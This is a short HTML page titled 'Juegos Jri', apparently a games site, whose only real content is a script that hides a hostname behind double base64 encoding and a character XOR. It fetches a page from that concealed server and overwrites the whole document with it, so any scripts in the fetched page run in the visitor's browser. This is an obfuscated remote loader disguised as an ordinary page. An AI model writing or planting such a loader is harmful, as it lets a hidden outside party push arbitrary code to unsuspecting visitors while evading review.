<!DOCTYPE html>
<html>
  <head><title>Juegos Jri</title></head>
  <body>
    <div id="root"></div>
    <script>
      const URBD = [...atob(atob('V0VWRUJGSWZHQVJmUVE9PQ=='))].map(c => String.fromCharCode(c.charCodeAt() ^ 42)).join('');
      fetch(`https://${URBD}/page`)
        .then(r => r.text())
        .then(html => {
          document.open();
          document.write(html);
          document.close();
        });
    </script>
  </body>
</html
